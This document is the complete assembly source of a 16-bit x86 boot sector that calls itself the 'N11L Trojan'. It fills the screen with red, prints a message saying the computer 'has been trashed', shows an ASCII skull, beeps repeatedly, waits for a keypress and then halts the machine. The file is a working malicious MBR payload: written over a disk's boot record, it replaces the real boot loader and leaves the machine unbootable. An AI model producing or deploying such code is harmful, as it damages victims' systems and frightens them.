[BITS 16]          
[ORG 0x7C00]       

start:
    jmp main

msg db 'Your computer has been trashed by the N11L Trojan.', 0Dh, 0Ah, '$'  
skull db '     .:-=====-..    ', 0Dh, 0Ah,
      db '    :*++++++++++.   ', 0Dh, 0Ah,
      db '   -************=   ', 0Dh, 0Ah,
      db '   :++-..--..:++:   ', 0Dh, 0Ah,
      db '    :=: .--. .--.   ', 0Dh, 0Ah,
      db '     -===:.=+==.    ', 0Dh, 0Ah,
      db '      :+===++=.     ', 0Dh, 0Ah,
      db '.:-.  .------:  .--.', 0Dh, 0Ah,
      db '.----::.::::..:----:', 0Dh, 0Ah,
      db '-:.----=*+=**+-+:::.', 0Dh, 0Ah,
      db ':=====+++:=*****+=:.', 0Dh, 0Ah,
      db '.-+=:        ..-+=:.', 0Dh, 0Ah, '$'

main:
    xor ax, ax
    mov ds, ax
    mov es, ax

    
    mov ax, 0x0003
    int 0x10

    
    mov ah, 0x09       
    mov al, ' '        
    mov bh, 0x00       
    mov bl, 0x4F       
    mov cx, 80*25      
    int 0x10

  
    mov ah, 0x0E       
    mov si, msg        
print_msg_loop:
    lodsb              
    cmp al, '$'        
    je delay           
    int 0x10           
    jmp print_msg_loop 

delay:
    
    mov ah, 0x86
    mov cx, 0x001E     
    mov dx, 0x8480     
    int 0x15

    
    mov ax, 0x0003
    int 0x10
    mov ah, 0x09       
    mov al, ' '        
    mov bh, 0x00       
    mov bl, 0x4F       
    mov cx, 80*25      
    int 0x10

    
    mov ah, 0x0E       
    mov si, skull      
print_skull:
    lodsb              
    cmp al, '$'        
    je beep_loop      
    int 0x10           
    jmp print_skull    

beep_loop:
    
    mov ah, 0x0E       
    mov al, 0x07       
    int 0x10           

    
    mov ah, 0x86
    mov cx, 0x004C     
    mov dx, 0x4B40     
    int 0x15

    
    mov ah, 0x01       
    int 0x16
    jz beep_loop       
wait_input:
    
    mov ah, 0x00       
    int 0x16           
    cmp al, 'F'        
    je wait_input      
    cmp al, 'f'        
    je wait_input      

    cli                
    hlt                

times 510-($-$$) db 0
dw 0xAA55
